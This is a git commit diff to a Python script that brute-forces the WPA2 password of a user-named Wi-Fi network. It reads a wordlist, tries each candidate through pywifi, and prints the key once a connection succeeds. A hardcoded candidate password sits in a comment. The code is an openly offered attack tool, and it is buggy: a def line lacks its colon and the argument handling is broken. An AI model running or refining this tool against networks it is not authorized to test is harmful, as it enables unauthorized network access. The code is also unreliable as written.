e0f0735cbe61f6a80a17d4504306c7cb47602242
Thomas Castelot <castelot.thomas@outlook.fr>
2020-12-13 19:46:47 +0100

    add file as parameter and go try on the computer

--- src/OSpy/bruteforce_wifi.py
+++ src/OSpy/bruteforce_wifi.py
@@ -6,40 +6,61 @@ import os
 import getopt
 
 
+def passwords_list(file)
+    passwords = []
+    with open(file, 'r', encoding='utf8') as words:
+        for password in words:
+            password = password.split("\n")
+            passwords.append(password)
+    return passwords
 
-if os.getuid() != 0:
-    print("You need to have root privileges to use this program. Please try again using 'sudo'.\n")
-    sys.exit()
 
-wifi = pywifi.PyWiFi()
-ifaces = wifi.interfaces()[0]
+def main(argv):
+    file = ''
+    try:
+        opts, args = getopt.getopt(argv, "r", ["file="])
+    except getopt.GetoptError:
+        print("usage: -r password_file")
+        sys.exit(2)
+    if os.getuid() != 0:
+        print("You need to have root privileges to use this program. Please "
+              "try again using 'sudo'.\n")
+        sys.exit()
+    file = args
+    if not os.path.exists(file):
+        print("file does not exists.")
+        sys.exit()
+    passwords = passwords_list(file)
+#    wifi = pywifi.PyWiFi()
+#    interfaces = wifi.interfaces()[0]
 
+    wifi = pywifi.PyWiFi()
+    interface = wifi.interfaces()[0]
 
-wifi = pywifi.PyWiFi()
-iface = wifi.interfaces()[0]
+    profile = pywifi.Profile()
+    profile.ssid = input("Enter the name of the wifi network you want to try "
+                         "to bruteforce:\n")
+    start_time = time.time()
+    profile.auth = const.AUTH_ALG_OPEN
+    profile.akm.append(const.AKM_TYPE_WPA2PSK)
+    profile.cipher = const.CIPHER_TYPE_CCMP
+    for password in passwords:
+        #profile.key = "rba5829qaBdk"
+        profile.key = password
+        interface.remove_all_network_profiles()
+        new_profile = interface.add_network_profile(profile)
+        time.sleep(1)
+        interface.connect(new_profile)
 
-profile = pywifi.Profile()
-profile.ssid = input("Enter the name of the wifi network you want to try to bruteforce:\n")
-start_time = time.time()
-profile.auth = const.AUTH_ALG_OPEN
-profile.akm.append(const.AKM_TYPE_WPA2PSK)
-profile.cipher = const.CIPHER_TYPE_CCMP
-profile.key = "rba5829qaBdk"
+        while interface.status() == const.IFACE_CONNECTING:
+            print("connecting pls wait")
+            time.sleep(1)
 
-iface.remove_all_network_profiles()
-new_profile = iface.add_network_profile(profile)
-time.sleep(1)
-iface.connect(new_profile)
-
-while ifaces.status() == const.IFACE_CONNECTING:
-    print("connecting pls wait")
-    time.sleep(1)
-
-if ifaces.status() == const.IFACE_CONNECTED:
-    print("Connected ! password for {} is {}\n".format(profile.ssid, profile.key))
-    print("Execution took {} seconds.".format(time.time()-start_time))
-    iface.disconnect()
-    exit()
-else:
-    print("arf")
-    exit()
+        if interface.status() == const.IFACE_CONNECTED:
+            print("Connected ! password for {} is {}\n".format(profile.ssid,
+                                                               profile.key))
+            print("Execution took {} seconds.".format(time.time()-start_time))
+            interface.disconnect()
+            exit()
+        else:
+            pass
